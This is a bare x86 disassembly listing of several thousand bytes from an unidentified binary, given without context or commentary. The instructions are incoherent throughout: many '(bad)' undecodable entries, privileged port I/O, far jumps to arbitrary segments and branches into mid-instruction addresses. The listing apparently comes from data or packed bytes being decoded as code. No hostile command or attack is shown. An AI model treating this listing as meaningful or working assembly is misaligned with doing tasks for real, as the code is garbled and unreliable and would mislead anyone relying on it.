  424dd1:	mov    ecx,DWORD PTR [ebx+0x5468f664]
  424dd7:	out    0x4f,al
  424dd9:	xcrypt-cfb (bad)
  424dda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ddb:	pusha  
  424ddc:	sub    eax,0xa1cd4eaa
  424de1:	xor    BYTE PTR [edx-0x685bd86e],ah
  424de7:	push   0x77a0fd07
  424dec:	inc    edi
  424ded:	(bad)  
  424dee:	cmp    eax,0xa965535c
  424df3:	dec    ecx
  424df4:	lods   al,BYTE PTR ds:[esi]
  424df5:	and    BYTE PTR [eax+0x3126eaa6],cl
  424dfb:	out    0x67,eax
  424dfd:	ret    0x670d
  424e00:	mov    edi,0x468cc9ea
  424e05:	adc    cl,BYTE PTR [edx+0x2a8acc7e]
  424e0b:	(bad)  
  424e0c:	(bad)  
  424e0d:	xchg   esp,eax
  424e0e:	sub    dl,bh
  424e10:	retf   0x9fa5
  424e13:	sub    DWORD PTR [ecx],0xd173b7b8
  424e19:	xor    al,0xae
  424e1b:	retf   0x61e8
  424e1e:	inc    edi
  424e1f:	sar    BYTE PTR [edx],1
  424e21:	int3   
  424e22:	fisttp QWORD PTR [esi+0xebb6323]
  424e28:	aaa    
  424e29:	pop    edx
  424e2a:	shr    edi,0xda
  424e2d:	jl     0x424e09
  424e2f:	outs   dx,DWORD PTR ds:[esi]
  424e30:	or     cl,cl
  424e32:	je     0x424e3a
  424e34:	mov    ds:0x592b852c,eax
  424e39:	mov    ah,0x5
  424e3b:	int3   
  424e3c:	cmp    eax,0x1e4ce5cf
  424e41:	stc    
  424e42:	repnz and DWORD PTR [ebx+0x17],esi
  424e46:	mov    WORD PTR [esi],gs
  424e48:	mov    ebp,0xa30a5083
  424e4d:	mov    al,0x24
  424e4f:	mov    bl,0x25
  424e51:	lahf   
  424e52:	xor    eax,0xb514f8e4
  424e57:	adc    BYTE PTR [edi+0x7],cl
  424e5a:	popf   
  424e5b:	xchg   ecx,eax
  424e5c:	pop    esi
  424e5d:	add    DWORD PTR [ebx-0x5b],0x15
  424e61:	jmp    0x424e4a
  424e63:	fdivp  st(7),st
  424e65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424e66:	add    ebx,DWORD PTR [esi-0x57]
  424e69:	cdq    
  424e6a:	mov    cl,0xe5
  424e6c:	pop    ecx
  424e6d:	push   ecx
  424e6e:	cmp    esi,DWORD PTR [edx+0x60]
  424e71:	sub    eax,0xa2008bd0
  424e76:	adc    al,0x7d
  424e78:	test   al,0x23
  424e7a:	pop    eax
  424e7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424e7c:	in     al,dx
  424e7d:	retf   
  424e7e:	pop    ss
  424e7f:	in     eax,dx
  424e80:	sub    eax,0x1f4a1761
  424e85:	cmp    eax,0xc8abd580
  424e8a:	inc    esp
  424e8b:	std    
  424e8c:	sbb    DWORD PTR [eax],0x45
  424e8f:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e91:	lea    eax,[ebx+0x4dd91437]
  424e97:	xchg   edi,eax
  424e98:	adc    eax,ebp
  424e9a:	repnz mov al,ds:0x81ba623e
  424ea0:	sub    eax,0x7a9cf49f
  424ea5:	inc    esp
  424ea6:	ficomp WORD PTR [edi+eax*8]
  424ea9:	jno    0x424e2e
  424eab:	cmp    al,0x0
  424ead:	or     eax,DWORD PTR [eax-0x3f0bddf8]
  424eb3:	das    
  424eb4:	push   eax
  424eb5:	lods   al,BYTE PTR ds:[esi]
  424eb6:	fs aas 
  424eb8:	sahf   
  424eb9:	cdq    
  424eba:	aad    0x5a
  424ebc:	xchg   ecx,eax
  424ebd:	push   eax
  424ebe:	ror    DWORD PTR [eax+edx*2-0x27],1
  424ec2:	push   cs
  424ec3:	cmp    al,0xe
  424ec5:	les    edx,FWORD PTR [eax-0x4c]
  424ec8:	stos   DWORD PTR es:[edi],eax
  424ec9:	cmp    bh,BYTE PTR [esi+eiz*4]
  424ecc:	or     edx,edi
  424ece:	dec    eax
  424ecf:	cwde   
  424ed0:	inc    ecx
  424ed1:	adc    eax,DWORD PTR [edx+0x601bef89]
  424ed7:	jo     0x424ee0
  424ed9:	(bad)  
  424edb:	add    al,0x43
  424edd:	cmp    eax,0xe5ff7327
  424ee2:	inc    esp
  424ee3:	xchg   edi,eax
  424ee4:	rcr    DWORD PTR [ebp-0xcb203b2],0x78
  424eeb:	iret   
  424eec:	mov    edi,0x462d3bbf
  424ef1:	xchg   DWORD PTR [edx+0x4ec9a4ec],esi
  424ef7:	pop    DWORD PTR [ebx+0x620bfdbe]
  424efd:	retf   0xae46
  424f00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f01:	(bad)  
  424f02:	mov    ch,0x5f
  424f04:	cdq    
  424f05:	pop    edx
  424f06:	aas    
  424f07:	push   esi
  424f08:	retf   
  424f09:	push   0xffffffcf
  424f0b:	pop    edx
  424f0c:	aam    0x2
  424f0e:	dec    eax
  424f0f:	aaa    
  424f10:	and    DWORD PTR [eax],ebx
  424f12:	push   edx
  424f13:	test   DWORD PTR [edi+0x280afcd],0xad177e91
  424f1d:	cmp    edi,DWORD PTR [edx+0xf]
  424f20:	sbb    ebx,DWORD PTR [ecx+ebx*4-0x673fbc20]
  424f27:	int    0x26
  424f29:	leave  
  424f2a:	dec    esp
  424f2b:	mov    eax,0x5186d246
  424f30:	scas   eax,DWORD PTR es:[edi]
  424f31:	dec    edi
  424f32:	stos   BYTE PTR es:[edi],al
  424f33:	adc    al,0x8b
  424f35:	test   al,0xbd
  424f37:	cs mov ecx,0x4a827271
  424f3d:	cli    
  424f3e:	dec    edx
  424f3f:	lds    ebp,FWORD PTR [edi]
  424f41:	ret    0x4e2a
  424f44:	not    BYTE PTR [ebp-0x22c44f]
  424f4a:	adc    dl,BYTE PTR [edx]
  424f4c:	icebp  
  424f4d:	mov    edx,0xde69f64d
  424f52:	sub    BYTE PTR [esp+edx*8-0x50dc3b29],al
  424f59:	push   cs
  424f5a:	cdq    
  424f5b:	mov    eax,ds:0x7ee997ca
  424f60:	jnp    0x424fe1
  424f62:	aas    
  424f63:	fdiv   st,st(0)
  424f65:	fwait
  424f66:	les    edi,FWORD PTR [ebp+0x63568ee2]
  424f6c:	xchg   edx,eax
  424f6d:	xor    BYTE PTR [esi+0x37],bl
  424f70:	pop    ds
  424f71:	xor    eax,0x668cacd4
  424f76:	in     al,dx
  424f77:	sub    bh,BYTE PTR [ebp-0x59]
  424f7a:	sub    al,0x2f
  424f7c:	test   edx,eax
  424f7e:	popa   
  424f7f:	push   ebp
  424f80:	xchg   ebp,eax
  424f81:	pop    ecx
  424f82:	xor    BYTE PTR [ebp-0x503169bc],dl
  424f88:	call   0x82e4:0x64090ba8
  424f8f:	daa    
  424f90:	(bad)  
  424f91:	jbe    0x424fdf
  424f93:	loop   0x424f16
  424f95:	jbe    0x424fe2
  424f97:	xchg   ebp,eax
  424f98:	dec    edi
  424f99:	cwde   
  424f9a:	cmp    cl,bh
  424f9c:	push   0xeb81031e
  424fa1:	mov    al,0x5f
  424fa3:	addr16 sbb esp,esp
  424fa6:	fdiv   QWORD PTR [eax-0x33]
  424fa9:	adc    eax,0x2a05f04c
  424fae:	neg    BYTE PTR [edx-0x7a]
  424fb1:	mov    edx,0x18d2a8e
  424fb6:	gs test al,0x97
  424fb9:	or     bl,BYTE PTR [edi]
  424fbb:	xchg   esi,eax
  424fbc:	cmp    bh,bh
  424fbe:	jo     0x424fb5
  424fc0:	ins    BYTE PTR es:[di],dx
  424fc2:	cmp    esp,DWORD PTR [edx]
  424fc4:	ja     0x424fc1
  424fc6:	not    BYTE PTR [eax]
  424fc8:	iret   
  424fc9:	mov    al,0xbd
  424fcb:	dec    ecx
  424fcc:	xchg   BYTE PTR [eax-0x41],bl
  424fcf:	add    dh,BYTE PTR [esi-0x36]
  424fd2:	jne    0x424ff9
  424fd4:	shr    DWORD PTR [edx-0x2f],1
  424fd7:	(bad)  
  424fd8:	inc    esi
  424fd9:	pop    ss
  424fda:	hlt    
  424fdb:	pop    esp
  424fdc:	pop    ebx
  424fdd:	ret    0xb2ee
  424fe0:	xor    eax,0x4a039d7b
  424fe5:	dec    edx
  424fe6:	cmp    BYTE PTR [edi],cl
  424fe8:	mov    BYTE PTR [esi],ch
  424fea:	aas    
  424feb:	push   esi
  424fec:	sbb    BYTE PTR [esi],cl
  424fee:	mov    bl,0x59
  424ff0:	xchg   DWORD PTR [ebx+0x7d24780],esi
  424ff6:	dec    esi
  424ff7:	ins    BYTE PTR es:[edi],dx
  424ff8:	test   BYTE PTR [ecx+eiz*8-0x3fafca70],cl
  424fff:	xchg   ecx,eax
  425000:	lock mov esp,0x3ecbb4de
  425006:	lods   eax,DWORD PTR ds:[esi]
  425007:	pop    ecx
  425008:	xchg   ebx,eax
  425009:	xor    cl,BYTE PTR [ebx-0x73faf2a3]
  42500f:	test   BYTE PTR [esi+0x70],bl
  425012:	adc    BYTE PTR [ecx+edx*4-0x7ed5b18a],ch
  425019:	fist   DWORD PTR [ebx-0x2d68c931]
  42501f:	(bad)  
  425021:	repz and eax,DWORD PTR [ebx-0x23]
  425025:	test   al,0xbc
  425027:	stos   BYTE PTR es:[edi],al
  425028:	cmp    DWORD PTR [esi+eax*8-0x61240f51],eax
  42502f:	dec    edi
  425030:	sub    DWORD PTR [esi-0x4b299035],edi
  425036:	retf   
  425037:	call   0xb11494f5
  42503c:	imul   edx,DWORD PTR [edi-0x21],0x7154d0e8
  425043:	sbb    eax,0xeccd9b7c
  425048:	sbb    DWORD PTR [ebp+0x607d7af2],0x7f
  42504f:	inc    edx
  425050:	adc    ebx,DWORD PTR [esi+0x2d0285f]
  425056:	and    al,0xc7
  425058:	sub    BYTE PTR [edx+0x4be540cf],dh
  42505e:	(bad)  
  425060:	push   cs
  425061:	jg     0x4250da
  425063:	je     0x42501a
  425065:	ror    BYTE PTR [edi-0x3f],0x7a
  425069:	sub    ebp,DWORD PTR [ecx]
  42506b:	jmp    0x425072
  42506d:	mov    ecx,0x7bc4cbbc
  425072:	pusha  
  425073:	xchg   ebx,eax
  425074:	fisubr WORD PTR [edi-0x72]
  425077:	(bad)  
  425078:	push   ss
  425079:	rcr    BYTE PTR [ecx],0x4b
  42507c:	loope  0x42509e
  42507e:	or     al,0xde
  425080:	push   es
  425081:	mov    al,ds:0x28fa941b
  425086:	push   ax
  425088:	das    
  425089:	adc    DWORD PTR [edx],edx
  42508b:	mov    al,0xf4
  42508d:	popa   
  42508e:	pop    edx
  42508f:	ret    
  425090:	mov    ah,0x49
  425092:	enter  0x2ff2,0x5
  425096:	nop
  425097:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425098:	dec    eax
  425099:	mov    eax,ds:0xf1c1e1af
  42509e:	stos   DWORD PTR es:[edi],eax
  42509f:	xchg   edx,eax
  4250a0:	loope  0x4250e1
  4250a2:	call   FWORD PTR [edx+0x3a4dc918]
  4250a8:	jnp    0x425122
  4250aa:	adc    BYTE PTR [edi],al
  4250ac:	data16 (bad) 
  4250ae:	cli    
  4250af:	cmp    DWORD PTR [eax+0x6760f929],esi
  4250b5:	xor    eax,0xdc01dfef
  4250ba:	mov    esp,0xa9e07c94
  4250bf:	repz cld 
  4250c1:	push   ss
  4250c2:	ret    0x7025
  4250c5:	and    edi,ecx
  4250c7:	add    ah,dh
  4250c9:	jae    0x42506f
  4250cb:	stc    
  4250cc:	push   0xffffffd2
  4250ce:	pop    ss
  4250cf:	xchg   edi,eax
  4250d0:	inc    esp
  4250d1:	jns    0x4250f1
  4250d3:	and    dh,BYTE PTR [ebp-0x476b22c5]
  4250d9:	sbb    edx,ecx
  4250db:	xchg   esi,eax
  4250dc:	sbb    eax,0x67fd6839
  4250e1:	mov    bl,0xf6
  4250e3:	adc    DWORD PTR [esi-0x46],ebp
  4250e6:	es cmp ch,cl
  4250e9:	retf   
  4250ea:	pop    ds
  4250eb:	dec    esp
  4250ec:	push   ebx
  4250ed:	fbstp  TBYTE PTR [edx+0x3760cfdb]
  4250f3:	bound  edi,QWORD PTR [ebp+0x2657ce9e]
  4250f9:	scas   al,BYTE PTR es:[edi]
  4250fa:	pop    edi
  4250fb:	jmp    0x4e28:0xc277eab6
  425102:	mov    edx,0xbbeec808
  425107:	out    dx,al
  425108:	add    BYTE PTR [eax],al
  42510a:	pop    ecx
  42510b:	push   ebp
  42510c:	push   esp
  42510d:	push   edx
  42510e:	pop    esp
  42510f:	push   ebx
  425110:	pop    edi
  425111:	pop    edi
  425112:	xchg   ebx,eax
  425113:	stos   DWORD PTR es:[edi],eax
  425114:	mov    ebx,0x3292dc96
  425119:	or     ebp,DWORD PTR [edx]
  42511b:	fild   WORD PTR [ecx]
  42511d:	add    BYTE PTR [esi-0x12fffffa],al
  425123:	in     al,0xf9
  425125:	rcr    edx,0x75
  425128:	loop   0x42519f
  42512a:	mov    ah,0x14
  42512c:	fidivr WORD PTR [eax-0x4d2e9bb1]
  425132:	daa    
  425133:	and    eax,0x372647b1
  425138:	inc    eax
  425139:	fdiv   st,st(1)
  42513b:	shl    DWORD PTR [edi+eiz*8-0x739b7ef7],0x8b
  425143:	(bad)  
  425145:	ins    BYTE PTR es:[edi],dx
  425146:	enter  0x5379,0x9f
  42514a:	(bad)  
  42514b:	pop    ebx
  42514c:	dec    esi
  42514d:	int3   
  42514e:	inc    ebp
  42514f:	and    ebx,DWORD PTR [edi-0x3c]
  425152:	ror    BYTE PTR [esi-0x58],cl
  425155:	mov    cl,0x11
  425157:	xor    BYTE PTR ds:0x2cd978ba,ah
  42515d:	test   BYTE PTR [ebx-0x34],al
  425160:	push   esp
  425161:	jp     0x4251b3
  425163:	mov    ebp,0x49f36e23
  425168:	in     al,dx
  425169:	ror    DWORD PTR [ebx-0x29],cl
  42516c:	jmp    0x4251a0
  42516e:	dec    esp
  42516f:	pop    edx
  425170:	mov    bh,0x4
  425172:	mov    dl,0x1b
  425174:	dec    ecx
  425175:	dec    ecx
  425176:	fimul  WORD PTR [edx-0x456c58b5]
  42517c:	sub    BYTE PTR [ecx+0x7d],al
  42517f:	push   edi
  425180:	call   0x49c7e695
  425185:	loopne 0x425195
  425187:	cli    
  425188:	repz push edx
  42518a:	or     BYTE PTR [edx],dl
  42518c:	jo     0x42511a
  42518e:	jbe    0x425111
  425190:	mov    bh,0x1
  425192:	out    dx,eax
  425193:	jle    0x4251a7
  425195:	mov    cl,0xcf
  425197:	pop    ebp
  425198:	popa   
  425199:	pop    edx
  42519a:	push   esi
  42519b:	fsub   st,st(5)
  42519d:	jl     0x42514c
  42519f:	stc    
  4251a0:	mov    eax,ds:0xa96513ae
  4251a5:	and    al,0x82
  4251a7:	les    ebp,FWORD PTR [eax+0x3]
  4251aa:	add    cl,al
  4251ac:	push   ebx
  4251ad:	fsub   st(5),st
  4251af:	rcl    DWORD PTR [edi-0x3f],0x76
  4251b3:	mov    ebx,0x543d7431
  4251b8:	inc    esp
  4251b9:	pop    ds
  4251ba:	jle    0x425168
  4251bc:	add    esp,eax
  4251be:	shl    ah,1
  4251c0:	in     al,0x97
  4251c2:	scas   al,BYTE PTR es:[edi]
  4251c3:	ins    BYTE PTR es:[edi],dx
  4251c4:	cs out dx,eax
  4251c6:	ja     0x42514c
  4251c8:	dec    ebx
  4251c9:	jne    0x4251ab
  4251cb:	mov    ds:0x45aa0c0,eax
  4251d0:	shl    BYTE PTR [ebx+0x1],1
  4251d3:	sub    ah,ch
  4251d5:	mov    ecx,edi
  4251d7:	push   cs
  4251d8:	push   esp
  4251d9:	push   esp
  4251da:	mov    ds,WORD PTR [ecx]
  4251dc:	test   eax,esi
  4251de:	ins    BYTE PTR es:[edi],dx
  4251df:	xor    BYTE PTR [ebp+0x15f2e833],ch
  4251e5:	ins    BYTE PTR es:[edi],dx
  4251e6:	or     ebx,edi
  4251e8:	add    dh,dl
  4251ea:	fisttp WORD PTR [esi-0x3792d8d1]
  4251f0:	push   es
  4251f1:	hlt    
  4251f2:	jae    0x425219
  4251f4:	out    0xbc,eax
  4251f6:	sbb    BYTE PTR [edx+0x74e9b83b],bh
  4251fc:	xchg   BYTE PTR [ecx+eax*4-0x69ee49e1],bl
  425203:	in     al,0x30
  425205:	stos   DWORD PTR es:[edi],eax
  425206:	xor    ebp,edx
  425208:	shl    BYTE PTR [ebx+0x46],1
  42520b:	add    BYTE PTR [esi],0xfe
  42520e:	cli    
  42520f:	push   esp
  425210:	test   DWORD PTR [eax],ebx
  425212:	iret   
  425213:	gs mov ch,0x24
  425216:	fnstenv [ebx-0x71]
  425219:	xchg   ebp,eax
  42521a:	pusha  
  42521b:	push   ebp
  42521c:	adc    al,dh
  42521e:	adc    eax,0x14cd970b
  425223:	mov    ?,WORD PTR [edi]
  425225:	dec    ebp
  425226:	mov    dh,0xc3
  425228:	lock mov ebx,0xdeeca143
  42522e:	sbb    bl,BYTE PTR [ecx+edi*1]
  425231:	sub    DWORD PTR [ecx+0x61e837ee],0x51564394
  42523b:	test   eax,0x43b69ab4
  425240:	ss or  al,0x88
  425243:	in     al,0x18
  425245:	inc    edi
  425246:	int3   
  425247:	xchg   edx,eax
  425248:	daa    
  425249:	mov    bh,0xeb
  42524b:	in     eax,0xf9
  42524d:	call   0x6fdf:0xc2ad4b05
  425254:	adc    edx,DWORD PTR [edi]
  425256:	into   
  425257:	js     0x425297
  425259:	lods   eax,DWORD PTR ds:[esi]
  42525a:	mov    DWORD PTR [ebx-0x2a],esi
  42525d:	inc    esi
  42525e:	sbb    BYTE PTR [edx+eiz*4-0x24],dh
  425262:	js     0x42521a
  425264:	pop    edx
  425265:	and    bh,bh
  425267:	inc    ecx
  425268:	add    al,0x20
  42526a:	xchg   esp,eax
  42526b:	test   al,0x51
  42526d:	xchg   ecx,eax
  42526e:	push   ebp
  42526f:	jae    0x4252a2
  425271:	loop   0x425246
  425273:	and    eax,0xebe03045
  425278:	ins    DWORD PTR es:[edi],dx
  425279:	mov    dl,0xe7
  42527b:	cmp    ecx,0xfae76485
  425281:	std    
  425282:	jge    0x425251
  425284:	fadd   DWORD PTR [edx]
  425286:	and    eax,DWORD PTR [ebp-0x309c8230]
  42528c:	pop    ds
  42528d:	imul   dh
  42528f:	and    dh,BYTE PTR [esi+0x70]
  425292:	imul   ecx,DWORD PTR [edi+0x25],0x40
  425296:	(bad)  
  425297:	enter  0x7209,0x90
  42529b:	std    
  42529c:	inc    eax
  42529d:	add    eax,0xffffffef
  4252a0:	and    ebx,ebp
  4252a2:	jne    0x42522c
  4252a4:	rol    bh,cl
  4252a6:	leave  
  4252a7:	sbb    eax,0xa3daeaf3
  4252ac:	inc    ebp
  4252ad:	retf   
  4252ae:	adc    dl,BYTE PTR [ebx+0x3aca3d3e]
  4252b4:	mov    ds:0x5b85df8f,al
  4252b9:	fldcw  WORD PTR [edi]
  4252bb:	test   eax,0x550606d7
  4252c0:	and    BYTE PTR [bx+si+0x43],al
  4252c4:	lea    edx,[ecx+0x7c]
  4252c7:	mov    esi,0x575728ca
  4252cc:	fdiv   DWORD PTR [edi-0x6]
  4252cf:	mov    BYTE PTR [esp+ebx*2+0x2b],dl
  4252d3:	adc    edi,DWORD PTR [esi-0x502a97fa]
  4252d9:	xor    eax,0x5353509c
  4252de:	cdq    
  4252df:	or     eax,0xb2545432
  4252e4:	jmp    0x425312
  4252e6:	mov    DWORD PTR [edx-0x54],0xaa0487a
  4252ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4252ee:	jg     0x42529a
  4252f0:	mov    ebx,0x4fec2287
  4252f5:	cwde   
  4252f6:	pop    ss
  4252f7:	ror    DWORD PTR [eax-0x70],0xec
  4252fb:	inc    ebx
  4252fc:	dec    ecx
  4252fd:	xor    al,0xed
  4252ff:	fadd   DWORD PTR [ebx-0x391f0ab3]
  425305:	xlat   BYTE PTR ds:[ebx]
  425306:	jp     0x425362
  425308:	cmp    esp,DWORD PTR [ecx+edi*1+0x42]
  42530c:	mov    dl,0xc9
  42530e:	push   eax
  42530f:	inc    eax
  425310:	pop    es
  425311:	mov    eax,0x6ea2ed2e
  425316:	cwde   
  425317:	imul   edi,esi,0x2e
  42531a:	add    al,0x56
  42531c:	adc    al,ch
  42531e:	mov    fs,WORD PTR [esi]
  425320:	out    0xc3,al
  425322:	sbb    al,0x5f
  425324:	sbb    bl,BYTE PTR [eax+0x97ab1ca]
  42532a:	sub    BYTE PTR [edi-0x39826569],bl
  425330:	rol    edx,cl
  425332:	test   DWORD PTR [eax],0xeec117d3
  425338:	out    0x98,eax
  42533a:	cmc    
  42533b:	xchg   DWORD PTR [esi+0x7db1f4eb],edx
  425341:	pop    ds
  425342:	je     0x42534a
  425344:	hlt    
  425345:	rcr    BYTE PTR [ebp+0x1a],0xed
  425349:	sbb    DWORD PTR [edx+0x38],esp
  42534c:	dec    edi
  42534d:	inc    ecx
  42534e:	xchg   edx,eax
  42534f:	dec    DWORD PTR [edi-0x47]
  425352:	inc    eax
  425353:	push   esp
  425354:	push   0x64
  425356:	cld    
  425357:	ror    esi,0xa0
  42535a:	dec    eax
  42535b:	xchg   DWORD PTR [edx-0x18],eax
  42535e:	inc    ebp
  42535f:	rol    al,0xcd
  425362:	enter  0xb609,0xe1
  425366:	shl    ah,1
  425368:	jnp    0x425326
  42536a:	push   0x19aba7a0
  42536f:	add    al,0x20
  425371:	shl    bl,0xe9
  425374:	pusha  
  425375:	sbb    edi,DWORD PTR [ebx]
  425377:	test   eax,0xbf96aa2a
  42537c:	mov    ah,0xe3
  42537e:	xor    BYTE PTR [ebx-0xb],0xb3
  425382:	call   0xfabd70f4
  425387:	pop    eax
  425388:	(bad)  
  425389:	mov    WORD PTR [ecx-0x71],ds
  42538c:	lock xchg ebp,eax
  42538e:	js     0x42535f
  425390:	push   esi
  425391:	push   esi
  425392:	xor    DWORD PTR ds:0x3947cae3,0xffffff9e
  425399:	mov    esp,0x7a9ea228
  42539e:	imul   ebp,ebp,0xffffff84
  4253a1:	call   DWORD PTR [esi+0x33]
  4253a4:	pop    edx
  4253a5:	(bad)  
  4253a6:	adc    al,0x8b
  4253a8:	xchg   DWORD PTR [ebx],edx
  4253aa:	mov    dh,0x55
  4253ac:	adc    DWORD PTR [ebx],0x30
  4253af:	lock fmul DWORD PTR [ebp+ebx*4-0x58]
  4253b4:	push   0xfffffff8
  4253b6:	test   eax,0x9fea328
  4253bb:	push   0xe4b50cb2
  4253c0:	pop    ss
  4253c1:	fcmovbe st,st(7)
  4253c3:	scas   eax,DWORD PTR es:[edi]
  4253c4:	sub    DWORD PTR [ebx-0x41],eax
  4253c7:	pop    esp
  4253c8:	sub    ah,BYTE PTR [eax+0xe]
  4253cb:	adc    DWORD PTR [eax],edi
  4253cd:	jg     0x425419
  4253cf:	mov    al,BYTE PTR [edx+0x65b4ae75]
  4253d5:	jb     0x42539c
  4253d7:	test   al,0xe1
  4253d9:	sub    BYTE PTR [edi+0x3a],bh
  4253dc:	and    BYTE PTR [edx+edx*1],ch
  4253df:	pop    ecx
  4253e0:	in     eax,0x9e
  4253e2:	or     BYTE PTR [esi-0x420590ee],cl
  4253e8:	jg     0x425386
  4253ea:	pop    es
  4253eb:	inc    edi
  4253ec:	(bad)  
  4253ed:	jmp    0x5c36a617
  4253f2:	pop    es
  4253f3:	dec    esi
  4253f4:	repnz mov bl,0xd7
  4253f7:	sub    edx,DWORD PTR [edx+eiz*2+0xa]
  4253fb:	inc    esp
  4253fc:	xchg   ecx,eax
  4253fd:	add    eax,0xbac34e84
  425402:	das    
  425403:	shl    BYTE PTR [ecx],cl
  425405:	(bad)  
  425406:	cli    
  425407:	inc    edx
  425408:	and    ebx,edx
  42540a:	mov    ebp,0x8ab80f64
  42540f:	push   ebp
  425410:	pop    esi
  425411:	ss test dh,ah
  425414:	bound  edi,QWORD PTR [ecx-0x44]
  425417:	add    al,0xe3
  425419:	sub    al,0xb6
  42541b:	adc    BYTE PTR [edx-0x4720243],bl
  425421:	xor    ebp,DWORD PTR [ebx-0x3a6358f7]
  425427:	jo     0x425494
  425429:	scas   al,BYTE PTR es:[edi]
  42542a:	jg     0x425473
  42542c:	(bad)  
  42542d:	add    DWORD PTR [esi+0x25],ecx
  425430:	test   eax,0x169fc758
  425435:	add    eax,0x7857dd38
  42543a:	sbb    ebx,ecx
  42543c:	pop    ebx
  42543d:	lock xor ebx,DWORD PTR [edi-0x1f3ee2c6]
  425444:	and    eax,0xebf9716f
  425449:	mov    BYTE PTR [eax-0x4e],0x72
  42544d:	cmc    
  42544e:	ss mov dh,ch
  425451:	std    
  425452:	xchg   esp,eax
  425453:	enter  0x630b,0x18
  425457:	dec    esi
  425458:	add    DWORD PTR [edx],ebp
  42545a:	cmp    eax,0x15091f61
  42545f:	test   DWORD PTR [ebp+0x4d18252a],edx
  425465:	dec    esi
  425466:	dec    ecx
  425467:	imul   eax,DWORD PTR [ebx+0x454158d1],0xd6aaebc4
  425471:	xor    BYTE PTR fs:0x8727a770,bl
  425478:	inc    BYTE PTR [edi+ebp*8-0x7e669596]
  42547f:	clc    
  425480:	adc    dl,bh
  425482:	cdq    
  425483:	fst    QWORD PTR [ecx-0x15e3ba5e]
  425489:	cmp    al,0xf4
  42548b:	sahf   
  42548c:	and    dl,dl
  42548e:	sbb    al,0x27
  425490:	sbb    ebp,ecx
  425492:	out    0x66,eax
  425494:	daa    
  425495:	sbb    al,0xe1
  425497:	(bad)  
  425498:	push   ecx
  425499:	add    dl,BYTE PTR [ecx-0x5e]
  42549c:	lods   eax,DWORD PTR ds:[esi]
  42549d:	leave  
  42549e:	shr    eax,0x14
  4254a1:	imul   eax,DWORD PTR ds:0xb72b14ff,0xffffffec
  4254a8:	xchg   ecx,eax
  4254a9:	mov    edi,0xb433db35
  4254ae:	es dec ebp
  4254b0:	cdq    
  4254b1:	jle    0x425434
  4254b3:	mov    ebp,0x2f88c208
  4254b8:	icebp  
  4254b9:	adc    ebx,DWORD PTR gs:[ebp+0x1]
  4254bd:	aaa    
  4254be:	imul   ecx,DWORD PTR [ebx-0x43],0xffffffee
  4254c2:	xor    DWORD PTR [edi-0x14],esp
  4254c5:	imul   esi,eax,0x10f7c2ac
  4254cb:	retf   0x1fff
  4254ce:	fnstcw WORD PTR [ebx+0x7f33e7a5]
  4254d4:	test   ebp,edx
  4254d6:	mov    eax,eax
  4254d8:	mov    edx,0x905c97f
  4254dd:	lds    eax,FWORD PTR [eax]
  4254df:	cmc    
  4254e0:	loopne 0x425551
  4254e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4254e3:	mov    ds:0x8d175ce2,eax
  4254e8:	out    dx,al
  4254e9:	out    0x71,eax
  4254eb:	or     bl,BYTE PTR [ecx-0x6df98168]
  4254f1:	mov    edi,0xe006e98d
  4254f6:	retf   
  4254f7:	daa    
  4254f8:	adc    edx,DWORD PTR [esi-0x5f]
  4254fb:	rcl    BYTE PTR [esi-0x7b],cl
  4254fe:	call   0x4fdc71bf
  425503:	stc    
  425504:	mov    dl,0x40
  425506:	bound  ebx,QWORD PTR [ebx+0xdaf9ce8]
  42550c:	sbb    DWORD PTR [esi],edx
  42550e:	or     dh,dl
  425510:	sub    ah,BYTE PTR [ecx]
  425512:	cmp    al,BYTE PTR [ebp-0x4360fa9b]
  425518:	clc    
  425519:	fcmovnu st,st(2)
  42551b:	ret    0x2a95
  42551e:	js     0x4254f5
  425520:	retf   0x3de7
  425523:	daa    
  425524:	jl     0x4254e3
  425526:	adc    esi,eax
  425528:	or     eax,0xe390159a
  42552d:	push   ds
  42552e:	shl    DWORD PTR [ebp+0x27],0x13
  425532:	adc    ebp,0xf9d2e08c
  425538:	jmp    0x2ce3:0x622c3f78
  42553f:	cvtps2pd xmm1,QWORD PTR [ecx+0x5]
  425543:	mov    bl,BYTE PTR ds:0x22e44ce9
  425549:	cmp    DWORD PTR [ecx+esi*8-0x1d],eax
  42554d:	lock push esp
  42554f:	test   al,0x17
  425551:	xor    ch,bh
  425553:	cwde   
  425554:	mov    eax,ds:0x5f9bd40
  425559:	fdecstp 
  42555b:	retf   
  42555c:	out    dx,eax
  42555d:	fstp   DWORD PTR [eax-0x6349e3b]
  425563:	cmp    eax,esp
  425565:	inc    esp
  425566:	out    0xed,al
  425568:	daa    
  425569:	leave  
  42556a:	idiv   edx
  42556c:	mov    dh,0x80
  42556e:	fs loop 0x42553d
  425571:	or     al,0x46
  425573:	mov    bh,al
  425575:	jle    0x425576
  425577:	mov    cl,BYTE PTR [esi+0x369a92b8]
  42557d:	jb     0x4255ea
  42557f:	inc    ebp
  425580:	scas   eax,DWORD PTR es:[edi]
  425581:	cmp    cl,dl
  425583:	or     eax,0x5cecf30d
  425588:	cdq    
  425589:	mov    ds:0x1e65dac7,al
  42558e:	dec    edx
  42558f:	mov    cs,WORD PTR [ecx+0x2c053f31]
  425595:	xchg   esp,eax
  425596:	cli    
  425597:	adc    BYTE PTR [edx],al
  425599:	jge    0x42557a
  42559b:	push   ecx
  42559c:	ds adc al,0xe8
  42559f:	mov    BYTE PTR [eax],dl
  4255a1:	mov    BYTE PTR [ebp+0x203cd75e],bl
  4255a7:	mov    ebp,0xae926bd6
  4255ac:	lahf   
  4255ad:	(bad)  
  4255af:	mov    ch,0x2b
  4255b1:	jle    0x425578
  4255b3:	scas   al,BYTE PTR es:[edi]
  4255b4:	cmp    al,al
  4255b6:	add    ebp,DWORD PTR [ebx-0x38]
  4255b9:	leave  
  4255ba:	in     al,dx
  4255bb:	cmp    bl,BYTE PTR [esi+0x222906fe]
  4255c1:	push   ds
  4255c2:	sar    edi,cl
  4255c4:	ss out dx,al
  4255c6:	mov    eax,ds:0x3125944
  4255cb:	sub    edi,DWORD PTR ds:0xde401fe3
